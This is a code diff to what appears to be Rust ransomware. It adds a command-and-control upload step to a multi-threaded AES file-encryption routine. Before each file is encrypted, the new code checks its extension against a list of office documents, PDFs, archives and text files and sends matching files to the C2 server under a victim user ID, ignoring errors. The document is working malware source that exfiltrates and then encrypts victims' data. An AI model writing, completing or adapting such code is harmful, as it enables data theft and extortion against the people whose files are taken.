@@ -18,6 +18,8 @@ use std::{
     thread::{self, JoinHandle},
 };
 
+use crate::c2::api::C2API;
+
 fn aes_256_ctr_encrypt_decrypt(ctext: &mut [u8], key: &[u8], nonce: &[u8]) -> Result<(), FmtError> {
     if key.len() != 32 {
         return Err(FmtError);
@@ -172,7 +174,9 @@ pub fn encrypt_decrypt_file(
     return Ok(total_read_bytes);
 }
 
-pub fn multi_threaded_encrypt_decrypt_files(directory: &str, aes_key: &[u8]){
+pub fn multi_threaded_encrypt_decrypt_files(directory: &str, aes_key: &[u8], user_id: String){
+    
+    let extensions = ["doc", "docx", "odt", "pdf", "xls", "xlsx", "ppt", "pptx", "zip", "txt"];
     let num_threads = 4;
 
     let mut file_paths: Vec<PathBuf> = Vec::new();
@@ -195,18 +199,28 @@ pub fn multi_threaded_encrypt_decrypt_files(directory: &str, aes_key: &[u8]){
 
     for _ in 0..num_threads {
         let mut aes_key_vec = aes_key.to_vec();
+        let user_id_clone = user_id.clone();
         let (tx, rx) = channel::<PathBuf>();
         job_senders.push(tx);
         let thread_handle = thread::spawn(move || 
             loop {
                 match rx.recv() {
                     Ok(path) => {
-                        
+                        let c2 = C2API::new();
                         if path.to_str().unwrap() == "_END_SEARCH_" {
                             for element in &mut aes_key_vec {
                                 *element = 0;
                             }
                             break;
+                        }
+                        if let Some(extension) = path.extension() {
+                            if let Some(extension_str) = extension.to_str() {
+                                if extensions.contains(&extension_str) {
+                                    match c2.upload_file(path.to_string_lossy().to_string(), &user_id_clone) {
+                                        _ => ()
+                                    };
+                                }
+                            }
                         }
                         match encrypt_decrypt_file(
                             path.to_str().unwrap(),
